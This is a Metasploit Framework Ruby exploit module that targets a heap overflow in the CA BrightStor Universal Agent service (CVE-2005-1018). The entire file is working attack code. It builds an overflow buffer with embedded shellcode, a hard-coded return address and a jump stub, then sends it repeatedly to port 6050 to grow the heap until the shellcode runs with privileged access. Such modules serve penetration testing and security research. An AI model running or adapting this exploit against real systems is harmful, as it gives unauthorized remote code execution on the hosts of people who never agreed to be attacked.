##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'CA BrightStor Universal Agent Overflow',
			'Description'    => %q{
				This module exploits a convoluted heap overflow in the CA
				BrightStor Universal Agent service. Triple userland
				exception results in heap growth and execution of
				dereferenced function pointer at a specified address.
					
			},
			'Author'         => [ 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'BID', '13102'],
					[ 'CVE', '2005-1018'],
					[ 'OSVDB', '15471' ],
					[ 'MIL', '16'],
					[ 'URL', 'http://www.idefense.com/application/poi/display?id=232&type=vulnerabilities'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					# 250 bytes of space (bytes 0xa5 -> 0xa8 = reversed)
					'Space'    => 164,
					'BadChars' => "\x00",
					'StackAdjustment' => -3500,
				},
			'Targets'        => 
				[
					[ 
						'Magic Heap Target #1',
						{
							'Platform' => 'win',
							'Ret'      => 0x01625c44, # We grow to our own return address
						},
					],
				],
			'DisclosureDate' => '',
			'DefaultTarget' => 0))
			
			register_options(
				[
					Opt::RPORT(6050)
				], self.class)	
	end

	def exploit

		print_status("Trying target #{target.name}...")
			
		# The server reverses four bytes starting at offset 0xa5 :0

		# Create the overflow string
		boom = 'X' * 1024

		# Required field to trigger the fault
		boom[248, 2] = [1000].pack('V')
		
		# The shellcode, limited to 250 bytes (no nulls)
		boom[256, payload.encoded.length] = payload.encoded

		# This should point to itself
		boom[576, 4] = [target.ret].pack('V')
		
		# This points to the code below
		boom[580, 4] = [target.ret + 8].pack('V')

		# We have 95 bytes, use it to hop back to shellcode
		boom[584, 6] = "\x68" + [target.ret - 320].pack('V') + "\xc3"

		# Stick the protocol header in front of our request
		req = "\x00\x00\x00\x00\x03\x20\xa8\x02" + boom

		# We keep making new connections and triggering the fault until
		# the heap is grown to encompass our known return address. Once
		# this address has been allocated and filled, each subsequent
		# request will result in our shellcode being executed.

		1.upto(200) {|i|	
			connect
			print_status("Sending request #{i} of 200...") if (i % 10) == 0
			sock.put(req)
			disconnect

			# Give the process time to recover from each exception
			sleep(0.1);
		}
	
		handler
	end

end

